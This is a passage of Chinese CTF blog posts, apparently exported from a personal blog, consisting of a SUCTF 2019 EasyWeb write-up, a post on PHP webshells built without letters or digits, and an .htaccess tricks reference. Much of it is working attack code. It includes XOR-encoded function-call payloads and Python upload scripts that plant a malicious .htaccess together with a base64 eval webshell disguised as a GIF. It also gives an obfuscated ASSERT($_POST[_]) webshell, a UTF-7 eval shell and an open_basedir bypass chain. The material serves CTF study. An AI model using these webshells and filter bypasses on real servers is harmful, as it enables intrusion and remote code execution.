<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">str = <span class="string">r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]&#123;&#125;\/&quot;</span></span><br><span class="line"><span class="comment"># if re.match(&#x27;[a-zA-Z0-9]+&#x27;,&#x27;a&#x27;):</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">print(chr(ord(<span class="string">&#x27;!&#x27;</span>)^ord(<span class="string">&#x27;@&#x27;</span>)))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(str)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str)):</span><br><span class="line">        result=chr(ord(str[j])^ord(str[i]))</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&#x27;[a-zA-Z0-9]+&#x27;</span>,result):</span><br><span class="line">           <span class="keyword">print</span> str[j]+<span class="string">&quot;^&quot;</span>+str[i]+<span class="string">&quot;=&quot;</span>+result</span><br><span class="line">           print(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>但是发现也有过滤一些特殊字符，所以这个方法不太行，</p>
<p><a href="https://my.oschina.net/u/4306654/blog/3363280">https://my.oschina.net/u/4306654/blog/3363280</a><br>用一下其他办法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">find = [<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;_&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result=chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a= i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)<span class="comment">#将十进制整数，转化为bytes(十六进制)</span></span><br><span class="line">            b= j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            a= urllib.parse.quote(a)<span class="comment">#进行URL编码</span></span><br><span class="line">            b= urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">&quot;%s:%s^%s&quot;</span>%(result,a,b))</span><br></pre></td></tr></table></figure>

<p>我们将范围扩大到很多不可见字符，这里就是使用ascii码了，然后为了防止被过滤，我就找了最下面的几个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t:%FE^%AA</span><br><span class="line">_:%FE^%A1</span><br><span class="line">G:%FE^%B9</span><br><span class="line">E:%FE^%BB</span><br></pre></td></tr></table></figure>

<p>绕过18个字符就是用get再传参一次</p>
<p><strong>first_payload for test:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;%A1%B9%BB%AA^%FE%FE%FE%FE&#125;&#123;%A1&#125;();&amp;%A1&#x3D;phpinfo</span><br><span class="line">$&#123;_GET&#125;&#123;%A1&#125;()&#x3D;$_GET(%A1)</span><br></pre></td></tr></table></figure>

<p>这里有个很奇怪的点，就是这个t，别人跑出来都是AA我跑出来是8A=-=，所以payload一直不对，但是放到python里面去解析，去反编码回去，又是正确的?难道又是版本问题吗？</p>
<p>总<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210610144501.png" alt="img" style="zoom:67%;"></p>
<p>总之，到这里就可以继续往下走了，接下来看源码，发现需要上传文件了<br>看一下过滤吧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">  <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">  mkdir($userdir);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">      $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">      $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">      <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">      $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">      @move_uploaded_file($tmp_name, $path);</span><br><span class="line">      print_r($path);</span><br></pre></td></tr></table></figure>

<p>1.检查后缀是否含有ph、检查内容是否含有&lt;?、检查是否为图片<br><img src="https://img2018.cnblogs.com/blog/1063309/201907/1063309-20190718171528562-530311975.png" alt="img" style="zoom:67%;"></p>
<h3 id="文件上传思路"><a href="#文件上传思路" class="headerlink" title="文件上传思路"></a>文件上传思路</h3><p>由于过滤了ph后缀的文件，所以我们只能上传user.ini或者htaccess，这里显然上传htaccess更合适，因为可以用来将其他非php的文件解析为php，但是接下来会检查内容是否含有&lt;? 这里就是一个难点了，因为此时短标签绕过不了，想着使用&lt;script&gt;进行绕过，但是刚刚我们可以看到这个php版本为7.几的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210610153840.png" alt="img" style="zoom:67%;"></p>
<p>这里有两种方法，一种是改变php的编码格式，另一种是以加密的形式传入，并解密读取<br>接下来是绕过图片检查，这里使用的函数是exit_imagetype()<br>**exif_imagetype()**读取图像的第一个字节并检查其签名。此时就很妨碍我们上传.htaccess了，这样就会不符合.htaccess的书写语法，导致无法解析.htaccess，那么我们该如何操作呢？这里说一下看完WP后的理解：要满足该函数的检查，首先会检查第一个字节，可以发现，第一个字节为空可以绕过检查，即/x00但是因为是图片检查，又需要定义其大小才会符合图片的定义（这里由于不了解exif_imagetype()的C代码运行逻辑，所以只能先猜测一下，待后面找到了再来补充，问了一下学长，确实是这样），接下来就是书写.htaccess的内容了，然后上传完.htaccess就上传我们的马，此时也需要加密一波再进行上传，头的检查和刚才的一样。</p>
<h4 id="htaccess文件内容构造"><a href="#htaccess文件内容构造" class="headerlink" title=".htaccess文件内容构造"></a>.htaccess文件内容构造</h4><p>首先解决第一个问题:没有上传窗口如何上传文件——使用Python的requests库上传文件<br><a href="https://blog.csdn.net/five3/article/details/74913742">https://blog.csdn.net/five3/article/details/74913742</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">conten_htacc=<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1</span></span><br><span class="line"><span class="string">#define height 1</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .gg</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=tt.gg#这里就将其进行base64进行编码</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://135d9802-5db9-41f2-8761-9eeb38a3ece9.node3.buuoj.cn?_=$&#123;%A1%B9%BB%AA^%FE%FE%FE%FE&#125;&#123;%A1&#125;();&amp;%A1=get_the_flag&quot;</span></span><br><span class="line"></span><br><span class="line">files=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,conten_htacc,<span class="string">&#x27;image/png&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">r=s.post(url,files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>根据这个获取文件夹所在位置<br>upload/tmp_4f105b2c0ec2da14aae9b130ee13f8e9/.htaccess<br>接下来是构造我们的图片马</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://a199f759-9689-41ad-b7a7-c0bab6144be6.node3.buuoj.cn/?_=$&#123;%A1%B9%BB%AA^%FE%FE%FE%FE&#125;&#123;%A1&#125;();&amp;%A1=get_the_flag&quot;</span></span><br><span class="line">content_hta=<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1</span></span><br><span class="line"><span class="string">#define height 1</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .test</span></span><br><span class="line"><span class="string">php_value auto_append_file  &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_233e0752380798f15678fca34b470aea/1.test</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">file1=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,content_hta,<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">r=s.post(url,files=file1).text</span><br><span class="line">print(r)</span><br><span class="line">txt_content=<span class="string">b&quot;GIF89a&quot;</span>+<span class="string">b&quot;aa&quot;</span>+base64.b64encode(<span class="string">b&quot;&lt;?php @eval($_GET[cmd])?&gt;&quot;</span>)</span><br><span class="line">file2=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.test&#x27;</span>,txt_content,<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">r=s.post(url,files=file2).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>

<p>这边有个小细节 因为我们需要让php中的内容进行base64解码，但是前面又有个GIF98a不是base64编码内容，为了不让编码紊乱，base64的编码是将每三个字符转化为四个字符，那么解码的时候就会将原本的四个字符转化为三个字符，所以此时要多加两个字符，才不会影响到后面的马<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210611093317.png" alt="img" style="zoom:67%;"></p>
<p>没办法用蚁剑直接连接，推测是因为路径限制<br>接下来我们要做的就是绕过open_basedir，进行文件的读取</p>
<p><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a></p>
<p><a href="https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/">https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/</a></p>
<p>这篇文章有关于open_basedir绕过的底层详解<br>看完以后我的理解是这样，ini_set open_basedir只是关注绝对路径和相对路径的拼接，其实是没有关注相对路径是会发生变化的</p>
<p>这里举个例子说明:<br>假设我们的open_basedir为/var/www/html/ 我们位于/var/www/html/test 目录下，执行第一个ini_set后，首先判断/var/www/html/test/..即/var/www/html/是否为open_basedir内，判断成功，<strong>因此直接更新open_basedir为..</strong><br><strong>chdir() 函数改变当前的目录。</strong>那么接下来我们执行chdir(‘..’) ..根据当前目录补全后为/var/www/html 而open_basedir补全以后也是var/www/html 同样满足，所以我们就可以这样一直跳转到根目录下</p>
<p>POC链：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210611105042.png" alt="img" style="zoom:67%;">
可以看到flag文件了

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(file_get_contents(&#39;&#x2F;THis_Is_tHe_F14g&#39;));</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>感觉这道题真的收获很多，这边理一下：<br>首先是思路:无字母数字如何getshell？——&gt;如何绕过文件上传限制——&gt;如何绕过open_basedir读取文件</p>
<p>收获知识点：<br>1.无字母数字获取脚本编写<br>2.PHP7特性下，变量解析的更新<br>3.htaccess+文件包含绕过内容过滤以及exif_imagetype的bypass<br>4.open_basedir+ini_set+chdir绕过open_basedir<br>没有实践的点记录一下：<br>exif_imagetype()以及open_basedir()+ini_set()函数的底层代码跳转过程</p>
<p>参考：<a href="https://mayi077.gitee.io/2020/02/14/SUCTF-2019-EasyWeb/">https://mayi077.gitee.io/2020/02/14/SUCTF-2019-EasyWeb/</a><br><a href="https://www.cnblogs.com/20175211lyz/p/11488051.html">https://www.cnblogs.com/20175211lyz/p/11488051.html</a></p>
<p><a href="https://www.jianshu.com/p/6f05923012d7">https://www.jianshu.com/p/6f05923012d7</a></p>
<p><a href="https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/">https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/</a></p>
<p><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a></p>
]]></content>
  </entry>
  <entry>
    <title>不包含数字和字母的webshell</title>
    <url>/2021/06/08/%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>已经做了两题有关无数字和字母的getshell，这里整理一下‘</p>
<h1 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h1><h2 id="方法一：异或运算获得字符"><a href="#方法一：异或运算获得字符" class="headerlink" title="方法一：异或运算获得字符"></a>方法一：异或运算获得字符</h2><p>在PHP中，两个字符串进行异或操作以后，得到的还是一个字符串，原理很简单，直接贴脚本了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">str = <span class="string">r&quot;!@#$%^*()+&lt;&gt;?;:-[]&#123;&#125;\/&quot;</span></span><br><span class="line"><span class="comment"># if re.match(&#x27;[a-zA-Z0-9]+&#x27;,&#x27;a&#x27;):</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">print(chr(ord(<span class="string">&#x27;!&#x27;</span>)^ord(<span class="string">&#x27;@&#x27;</span>)))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(str)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str)):</span><br><span class="line">        result=chr(ord(str[j])^ord(str[i]))</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&#x27;[a-zA-Z0-9]+&#x27;</span>,result):</span><br><span class="line">       <span class="comment"># if result==&#x27;_&#x27;:</span></span><br><span class="line">           print(str[j]+<span class="string">&quot;^&quot;</span>+str[i]+<span class="string">&quot;=&quot;</span>+result)</span><br></pre></td></tr></table></figure>

<p>同类型的还有一个取反</p>
<h2 id="方法二：-特性取字符"><a href="#方法二：-特性取字符" class="headerlink" title="方法二：++特性取字符"></a>方法二：++特性取字符</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210609005654.png" alt="img" style="zoom:50%;">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line">$_=$_[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<h1 id="提高篇"><a href="#提高篇" class="headerlink" title="提高篇"></a>提高篇</h1><h3 id="长度限制-不包含-和"><a href="#长度限制-不包含-和" class="headerlink" title="长度限制+不包含$和_"></a>长度限制+不包含$和_</h3><h4 id="php7中关于变量处理的变化"><a href="#php7中关于变量处理的变化" class="headerlink" title="php7中关于变量处理的变化"></a>php7中关于变量处理的变化</h4><h5 id="1-解析顺序"><a href="#1-解析顺序" class="headerlink" title="1.解析顺序"></a>1.解析顺序</h5><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210610002554.png" alt="img" style="zoom:50%;">
对变量、属性和方法的间接调用现在将严格遵循从左到右的顺序来解析

<h5 id="2-执行动态函数方法"><a href="#2-执行动态函数方法" class="headerlink" title="2.执行动态函数方法"></a>2.执行动态函数方法</h5><p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)(); &#x2F;&#x2F;(phpinfo)()</span><br></pre></td></tr></table></figure>

<h4 id="PHP5中如何执行方法"><a href="#PHP5中如何执行方法" class="headerlink" title="PHP5中如何执行方法"></a>PHP5中如何执行方法</h4><h5 id="思维导入"><a href="#思维导入" class="headerlink" title="思维导入"></a>思维导入</h5><p>大部分语言都不是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互，操作系统里面包含最重要的两个功能就是shell(系统命令)和文件系统。</p>
<p>PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？</p>
<p>这里有个知识点需要了解一下，在linux系统中，许多系统命令都是有自己的脚本文件在，我们可以通过调用这些脚本文件来执行shell命令，这也就是之前所说的linux系统中，一切皆文件的思想，即使用bash执行file文件中的命令</p>
<p>介绍两个shell知识点:<br>1、shell可以用.来执行任意脚本，并且不需要file有x权限<br>2、linux文件名支持用glob通配符代替</p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>上传bash文件——执行文件</p>
<p>问题一：没有上传窗口文件该如何上传？</p>
<p>使用脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">files&#x3D;&#123;</span><br><span class="line">	&#39;file&#39;:open(&#39;1.txt&#39;,rb)</span><br><span class="line">&#125;</span><br><span class="line">url&#x3D;&quot;&quot;</span><br><span class="line">response&#x3D;requests.get(url,files&#x3D;files)</span><br><span class="line">print(reponse.txt)</span><br></pre></td></tr></table></figure>

<p>利用脚本post直接上传</p>
<p>问题二：不能用字母数字，如何选中所要执行的文件？</p>
<p>这个时候就利用了glob通配符的知识了，我们知道，上传的文件会被临时储存在/tmp/文件夹下，那么如何确定其他的字符呢？</p>
<p>*<em>首先</em>可以代表0个及以上的任意字符**<br><strong>？可以代表1个任意字符</strong></p>
<p>所以我们的文件名就可以表示为/*/??????或者/???/??????（这里假定文件名为6位）</p>
<p>但是此时，符合此文件名可能不止一位，所以该如何更精准的定位呢？</p>
<h4 id="深入理解glob通配符"><a href="#深入理解glob通配符" class="headerlink" title="深入理解glob通配符"></a>深入理解glob通配符</h4><p><strong>glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”并且支持利用[0-9]来表示一个范围</strong>。</p>
<p>筛选方法：<br>1.???<code>[^x]</code>??筛选出第四个字符不是x的项<br>2.???[@-[]??筛选出第四个字符时大写字母的项（这里利用了ascc码的一个范围）</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210610141755.png" alt="image.png"></p>
<p>参考:<a href="https://www.php.net/manual/zh/migration70.incompatible.php">https://www.php.net/manual/zh/migration70.incompatible.php</a></p>
]]></content>
  </entry>
  <entry>
    <title>htaccess文件详解</title>
    <url>/2021/06/11/htaccess%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉以前学的确实是不够精，原来htaccess文件不止是可以将其他文件以php的方式解析</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>htaccess提供了针对目录改变配置的方法</p>
<h2 id="可实现功能"><a href="#可实现功能" class="headerlink" title="可实现功能"></a>可实现功能</h2><p>文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能</p>
<h2 id="指令作用范围"><a href="#指令作用范围" class="headerlink" title="指令作用范围"></a>指令作用范围</h2><p>.htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有.htaccess文件，而指令是按查找顺序依次生效的，所以一个特定目录下的.htaccess文件中的指令可能会覆盖其上级目录中的.htaccess文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。</p>
<h2 id="一些代码整合"><a href="#一些代码整合" class="headerlink" title="一些代码整合"></a>一些代码整合</h2><h3 id="让某些文件以php的方式解析"><a href="#让某些文件以php的方式解析" class="headerlink" title="让某些文件以php的方式解析"></a>让某些文件以php的方式解析</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .png</span><br><span class="line">将png解析为php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt; </span><br><span class="line">SetHandler application&#x2F;x-httpd-php </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line">包含1的文件均解析为php</span><br></pre></td></tr></table></figure>

<h3 id="在所有页面包含-require-某个文件"><a href="#在所有页面包含-require-某个文件" class="headerlink" title="在所有页面包含(require)某个文件"></a>在所有页面包含(require)某个文件</h3><p><strong>auto_prepend_file与auto_append_file使用方法</strong></p>
<p>php.ini中有两项</p>
<p>auto_prepend_file 在页面顶部加载文件</p>
<p>auto_append_file  在页面底部加载文件</p>
<p>使用这种方法可以不需要改动任何页面，当需要修改顶部或底部require文件时，只需要修改auto_prepend_file与auto_append_file的值即可。</p>
<h4 id="思路拓展："><a href="#思路拓展：" class="headerlink" title="思路拓展："></a>思路拓展：</h4><p>我们看一下这个原理，他是文件包含的思想在某个页面加载文件，当我们想到文件包含的时候自然而然地就会想到php伪协议，这就是这个功能的厉害所在<br>如果有一道题目，他过滤了php的所有标签，但是允许你上传htaccess，这个时候的思路就是，将含有马的文件base64加密上传，然后再htaccess添加配置：php伪协议解码打开<br>当然显示的页面本身的代码也要是php语言</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file xxx.php</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.wuwu&quot;</span><br></pre></td></tr></table></figure>

<p>使作用范围内的php文件在文件头/尾自动include指定文件，支持php伪协议</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value include_path &quot;xxx&quot;</span><br></pre></td></tr></table></figure>

<p>如果当前目录无法写文件，也可以改变包含文件的路径，去包含别的路径的文件</p>
<p>用途：文件包含，可以配合AddType</p>
<h3 id="利用报错信息写文件"><a href="#利用报错信息写文件" class="headerlink" title="利用报错信息写文件"></a>利用报错信息写文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value error_reporting 32767</span><br><span class="line">php_value error_log &#x2F;tmp&#x2F;fl3g.php</span><br></pre></td></tr></table></figure>

<p>开启报错的同时将报错信息写入文件</p>
<p>用途：利用报错写shell</p>
<h3 id="UTF-7编码绕过尖括号-lt-过滤"><a href="#UTF-7编码绕过尖括号-lt-过滤" class="headerlink" title="UTF-7编码绕过尖括号&lt;过滤"></a>UTF-7编码绕过尖括号&lt;过滤</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value zend.multibyte 1 # 启用多字节编码的源文件解析</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure>

<p>将代码的解析方式改成UTF-7</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mb_convert_encoding(&#39;&lt;?php eval($_GET[\&#39;cmd\&#39;]); ?&gt;&#39;,&quot;utf-7&quot;);</span><br></pre></td></tr></table></figure>

<p>payload样例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs</span><br></pre></td></tr></table></figure>

<h3 id="prce绕过正则匹配"><a href="#prce绕过正则匹配" class="headerlink" title="prce绕过正则匹配"></a>prce绕过正则匹配</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code> 而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0)</code>，因此可以通过php_value 设置正则回朔次数来使正则匹配的结果返回为false而不是0或1，默认的回朔次数比较大，可以设成0，那么当超过此次数以后将返回false</p>
</blockquote>
<h2 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h2><p>.htaccess似乎可以像shell那样使用<code>\</code>将两行内容解释为一行</p>
<ul>
<li>绕过脏字符<br>如果.htaccess文件中有不符合语法的内容，访问服务器会直接报500，如果题目中乱写.htaccess文件，我们可以尝试换行注释掉脏字符<br>例如：题目中有<code>file_put_contents($filename, $content . &quot;\nJust one chance&quot;)</code>，我们payload最后可以加上<code>#\</code>，<code>#</code>负责注释，<code>\</code>将注释符和脏字符连成一行，注释掉脏字符，最后的文件为</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value include_path &quot;&#x2F;tmp&quot;</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"># \</span><br><span class="line">Just one chance</span><br></pre></td></tr></table></figure>

<ul>
<li>绕过WAF<br>如果题目过滤了’file’，可以这么写.htaccess</li>
</ul>
